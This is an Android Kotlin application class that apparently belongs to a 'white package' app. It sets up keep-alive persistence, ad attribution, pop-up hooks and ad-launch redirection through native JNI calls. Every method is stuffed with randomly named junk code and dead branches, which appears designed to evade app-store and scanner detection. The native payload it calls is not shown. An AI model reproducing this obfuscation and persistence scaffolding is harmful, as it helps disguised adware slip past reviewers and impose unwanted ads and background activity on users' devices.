package vef.kdo.utblh

import android.app.Application
import android.os.Bundle
import android.content.Intent
import com.keep.up.all.NativeJniUtils
import vef.bzp.hss.base.APPContext
import vef.bzp.hss.base.OverseaAppHost
import vef.bzp.hss.base.OverseaAppInitializer
import vef.bzp.hss.ad.runtime.AdLifecycleInstaller

class ABE : Application(), OverseaAppHost {

    companion object {
        @JvmStatic
        var insApp: ABE? = null
    }

    override val restrictSubProcessInAttach: Boolean = true

    override fun onCreate() {
        val arr_LQsBJgibkaltgrcdn = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_cboYfuvvPrLjzoeBjWd  = (arr_LQsBJgibkaltgrcdn  shl 46) xor (arr_LQsBJgibkaltgrcdn  shr 31)
         val j_dzmzUc  = i_cboYfuvvPrLjzoeBjWd .inv() and 0xFFFF
         if (j_dzmzUc  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_OXGDjLxpHGnwZVBv")
         }
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 开启子进程限制后，非主进程不再执行后续业务初始化，避免在 Kwai :res 等子进程
        // 安装生命周期监听或启动定时器，引发 Binder Bad file descriptor 崩溃。
//        if (restrictSubProcessInAttach && !ProcessUtils.isMainProcess(this)) {
//            return
//        }
        // 保证白包有 context
        APPContext.setApplication(this)
        AdLifecycleInstaller.install(this)
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
        val fvRcOF : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val NEDuAQSDFRP  = fvRcOF ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_9" 
            }
            if (NEDuAQSDFRP .startsWith("LzqulLtMekGGDeKyPO ")) {
                android.util.Log.v("TAG", NEDuAQSDFRP )
            }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        val arr_USnMKXK  = listOf("vITkdiPgmB", "SMSOGFLsZpxWEzoLsU", "RBtgRKAQaOKOuo").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_NLwvmu  = arr_USnMKXK .filter { it.length > 28 }
         if (ad_NLwvmu .isNotEmpty() && java.lang.System.currentTimeMillis() < 79) {
             ad_NLwvmu .forEach { _ ->  }
         }
        VELE.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_flRNXfWHAvFcXYjSxM  = listOf("NlXOScHBFmka", "UOXZDHCYjM", "RatGMzSiaeBfWmtDfi").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_sILrlacr  = arr_flRNXfWHAvFcXYjSxM .filter { it.length > 10 }
         if (ad_sILrlacr .isNotEmpty() && java.lang.System.currentTimeMillis() < 90) {
             ad_sILrlacr .forEach { _ ->  }
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        NativeJniUtils.pageopen(intent)
    }

    override fun initPopPower() {
           val eAOCLgnqwdDS : Any = if (kotlin.random.Random.nextBoolean()) 10 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val PeTrTIINVUMZeZRcCgd  = (eAOCLgnqwdDS  as? String)?.reversed() ?: "JPUbfHkWuDeqYOAS_-379925238"

        if (PeTrTIINVUMZeZRcCgd  == "RsgqvlqtURoon") {
            java.lang.System.out.print(PeTrTIINVUMZeZRcCgd )
        }
    }

    override fun initKeepPower(app: Application) {
        val HNNqUPkgMBcC : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val OkLtbuDdPobwuka  = HNNqUPkgMBcC ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_46" 
            }
            if (OkLtbuDdPobwuka .startsWith("ecCpeXZTHiALU ")) {
                android.util.Log.v("TAG", OkLtbuDdPobwuka )
            }
        NativeJniUtils.virinit(insApp)
    }


}